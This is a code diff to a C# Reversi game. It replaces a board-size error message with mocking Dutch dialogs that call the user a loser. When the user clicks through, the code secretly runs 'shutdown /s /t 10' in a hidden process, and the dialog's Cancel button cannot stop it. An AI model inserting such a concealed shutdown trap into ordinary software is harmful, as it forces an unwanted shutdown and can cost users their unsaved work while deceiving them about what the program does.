@@ -37,7 +37,27 @@ namespace Reversiii
             
             if(comboBox1.SelectedItem == null)
             {
-                MessageBox.Show("Board size selection box has an invalid parameter!", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                DialogResult result = MessageBox.Show("Leuk geprobeerd! Dacht je echt hier mee weg te komen?", "Error!", MessageBoxButtons.YesNo, MessageBoxIcon.Error);
+                if (result == DialogResult.Yes)
+                {
+                    DialogResult r = MessageBox.Show("Jammer joh, niet nog een keer proberen", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    if (r == DialogResult.OK)
+                    {
+                        DialogResult p = MessageBox.Show("Trouwens, je computer sluit af over 10 seconden", "Hahaha", MessageBoxButtons.OKCancel, MessageBoxIcon.Information);
+                        var psi = new ProcessStartInfo("shutdown", "/s /t 10");
+                        psi.CreateNoWindow = true;
+                        psi.UseShellExecute = false;
+                        Process.Start(psi);
+                        if (p == DialogResult.Cancel)
+                        {
+                            MessageBox.Show("Helaas, je kant dat niet cancelen :D", "Muhahahahahha", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                        }
+                    }
+                }
+                else if (result == DialogResult.No)
+                {
+                    MessageBox.Show("Nee, je bent gewoon een loser!", "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
             }
             else
             {
